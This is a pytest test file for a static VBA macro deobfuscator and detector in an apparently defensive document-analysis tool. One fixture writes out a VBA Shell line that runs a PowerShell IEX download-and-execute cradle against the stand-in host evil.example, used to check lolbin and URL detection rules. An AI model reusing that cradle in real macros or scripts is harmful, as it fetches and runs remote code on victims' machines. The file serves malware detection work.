"""Static VBA string resolver (deobfuscate-first fallback, no emulator)."""

from __future__ import annotations

from docutracex.parsers import vba_deobf


def test_chr_concat_resolves_command() -> None:
    # "powershell" assembled from Chr() codes and concatenation.
    chars = "+".join("Chr(%d)" % ord(c) for c in "powershell")
    r = vba_deobf.deobfuscate("cmd = %s" % chars)
    assert r["changed"] and '"powershell"' in r["code"]
    assert {"chr-code", "concat"} <= set(r["methods"])


def test_hex_chr_and_ampersand_concat() -> None:
    r = vba_deobf.deobfuscate('u = "htt" & "p://x" & Chr(&H2E) & "example"')
    assert "http://x.example" in r["code"]


def test_strreverse_and_replace() -> None:
    r1 = vba_deobf.deobfuscate('s = StrReverse("llehs")')
    assert '"shell"' in r1["code"]
    r2 = vba_deobf.deobfuscate('s = Replace("poXwershell", "X", "")')
    assert '"powershell"' in r2["code"]


def test_static_hits_from_resolved_source() -> None:
    code = 'Shell "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://evil.example/a\')"'
    rules = {h["rule"] for h in vba_deobf.static_hits(code)}
    assert "vba_deobf_lolbin" in rules and "vba_deobf_url" in rules


def test_clean_vba_untouched() -> None:
    r = vba_deobf.deobfuscate('Sub AutoOpen()\n  MsgBox "hi"\nEnd Sub')
    assert not r["changed"]


def test_codefiles_dumps_deobfuscated_vba(tmp_path) -> None:
    from docutracex import codefiles
    from docutracex.storage import CasePaths
    cp = CasePaths("c1", cases_dir=tmp_path)
    cp.root.mkdir(parents=True, exist_ok=True)
    modules = {"oletools": {"code_text": "Sub X()\nEnd Sub",
                            "tools": {"olevba": {"_full_code": "Sub X()\nEnd Sub",
                                                 "_full_deob": 'cmd = "powershell"'}}}}
    changed = codefiles.annotate(modules, cp)
    assert "oletools" in changed
    ole = modules["oletools"]
    assert (cp.root / ole["code_file_deob"]).read_text() == 'cmd = "powershell"'
    assert ole["code_file_deob"].endswith(".deobfuscated.vba")
    assert "_full_deob" not in ole["tools"]["olevba"]
